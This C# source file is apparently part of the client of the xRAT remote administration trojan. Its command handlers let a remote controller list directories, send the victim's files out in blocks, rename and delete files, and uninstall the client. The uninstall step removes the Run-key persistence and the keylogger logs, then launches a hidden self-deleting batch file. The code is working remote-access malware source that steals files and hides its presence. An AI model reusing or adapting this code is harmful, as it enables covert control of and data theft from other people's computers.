using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using Microsoft.Win32;
using xClient.Config;
using xClient.Core.Helper;

namespace xClient.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT MANIPULATE DIRECTORIES AND FILES (excluding the program). */
    public static partial class CommandHandler
    {
        public static void HandleDirectory(Packets.ServerPackets.Directory command, Client client)
        {
            try
            {
                DirectoryInfo dicInfo = new DirectoryInfo(command.RemotePath);

                FileInfo[] iFiles = dicInfo.GetFiles();
                DirectoryInfo[] iFolders = dicInfo.GetDirectories();

                string[] files = new string[iFiles.Length];
                long[] filessize = new long[iFiles.Length];
                string[] folders = new string[iFolders.Length];

                int i = 0;
                foreach (FileInfo file in iFiles)
                {
                    files[i] = file.Name;
                    filessize[i] = file.Length;
                    i++;
                }
                if (files.Length == 0)
                {
                    files = new string[] { DELIMITER };
                    filessize = new long[] { 0 };
                }

                i = 0;
                foreach (DirectoryInfo folder in iFolders)
                {
                    folders[i] = folder.Name;
                    i++;
                }
                if (folders.Length == 0)
                    folders = new string[] { DELIMITER };

                new Packets.ClientPackets.DirectoryResponse(files, folders, filessize).Execute(client);
            }
            catch
            {
                new Packets.ClientPackets.DirectoryResponse(new string[] { DELIMITER }, new string[] { DELIMITER },
                    new long[] { 0 }).Execute(client);
            }
        }

        public static void HandleDownloadFile(Packets.ServerPackets.DownloadFile command, Client client)
        {
            new Thread(() =>
            {
                try
                {
                    FileSplit srcFile = new FileSplit(command.RemotePath);
                    if (srcFile.MaxBlocks < 0)
                        new Packets.ClientPackets.DownloadFileResponse(command.ID, "", new byte[0], -1, -1,
                            srcFile.LastError).Execute(client);

                    for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                    {
                        if (!client.Connected) return;
                        if (_canceledDownloads.ContainsKey(command.ID)) return;

                        byte[] block;
                        if (srcFile.ReadBlock(currentBlock, out block))
                        {
                            new Packets.ClientPackets.DownloadFileResponse(command.ID,
                                Path.GetFileName(command.RemotePath), block, srcFile.MaxBlocks, currentBlock,
                                srcFile.LastError).Execute(client);
                            //Thread.Sleep(200);
                        }
                        else
                            new Packets.ClientPackets.DownloadFileResponse(command.ID, "", new byte[0], -1, -1,
                                srcFile.LastError).Execute(client);
                    }
                }
                catch (Exception ex)
                {
                    new Packets.ClientPackets.DownloadFileResponse(command.ID, "", new byte[0], -1, -1, ex.Message)
                        .Execute(client);
                }
            }).Start();
        }

        public static void HandleDownloadFileCanceled(Packets.ServerPackets.DownloadFileCanceled command, Client client)
        {
            if (!_canceledDownloads.ContainsKey(command.ID))
            {
                _canceledDownloads.Add(command.ID, "canceled");
                new Packets.ClientPackets.DownloadFileResponse(command.ID, "", new byte[0], -1, -1, "Canceled").Execute(
                    client);
            }
        }

        public static void HandleUninstall(Packets.ServerPackets.Uninstall command, Client client)
        {
            new Packets.ClientPackets.Status("Uninstalling... bye ;(").Execute(client);

            if (Settings.STARTUP)
            {
                if (SystemCore.AccountType == "Admin")
                {
                    try
                    {
                        using (
                            RegistryKey key =
                                Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                                    true))
                        {
                            if (key != null)
                            {
                                key.DeleteValue(Settings.STARTUPKEY, true);
                                key.Close();
                            }
                        }
                    }
                    catch
                    {
                        // try deleting from Registry.CurrentUser
                        using (
                            RegistryKey key =
                                Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                                    true))
                        {
                            if (key != null)
                            {
                                key.DeleteValue(Settings.STARTUPKEY, true);
                                key.Close();
                            }
                        }
                    }
                }
                else
                {
                    try
                    {
                        using (
                            RegistryKey key =
                                Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                                    true))
                        {
                            if (key != null)
                            {
                                key.DeleteValue(Settings.STARTUPKEY, true);
                                key.Close();
                            }
                        }
                    }
                    catch
                    {
                    }
                }
            }

            string logsDirectory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Logs\\";
            if (Directory.Exists(logsDirectory)) // try to delete Logs from Keylogger
            {
                try
                {
                    Directory.Delete(logsDirectory, true);
                }
                catch
                {
                }
            }

            try
            {
                string filename = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    Helper.Helper.GetRandomFilename(12, ".bat"));

                string uninstallBatch = (Settings.INSTALL && Settings.HIDEFILE)
                    ? "@echo off" + "\n" +
                      "echo DONT CLOSE THIS WINDOW!" + "\n" +
                      "ping -n 20 localhost > nul" + "\n" +
                      "del /A:H " + "\"" + SystemCore.MyPath + "\"" + "\n" +
                      "del " + "\"" + filename + "\""
                    : "@echo off" + "\n" +
                      "echo DONT CLOSE THIS WINDOW!" + "\n" +
                      "ping -n 20 localhost > nul" + "\n" +
                      "del " + "\"" + SystemCore.MyPath + "\"" + "\n" +
                      "del " + "\"" + filename + "\""
                    ;

                File.WriteAllText(filename, uninstallBatch);
                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    UseShellExecute = true,
                    FileName = filename
                };
                Process.Start(startInfo);
            }
            finally
            {
                SystemCore.Disconnect = true;
                client.Disconnect();
            }
        }

        public static void HandleRename(Packets.ServerPackets.Rename command, Client client)
        {
            try
            {
                if (command.IsDir)
                    Directory.Move(command.Path, command.NewPath);
                else
                    File.Move(command.Path, command.NewPath);

                HandleDirectory(new Packets.ServerPackets.Directory(Path.GetDirectoryName(command.NewPath)), client);
            }
            catch
            {
            }
        }

        public static void HandleDelete(Packets.ServerPackets.Delete command, Client client)
        {
            try
            {
                if (command.IsDir)
                    Directory.Delete(command.Path, true);
                else
                    File.Delete(command.Path);

                HandleDirectory(new Packets.ServerPackets.Directory(Path.GetDirectoryName(command.Path)), client);
            }
            catch
            {
            }
        }
    }
}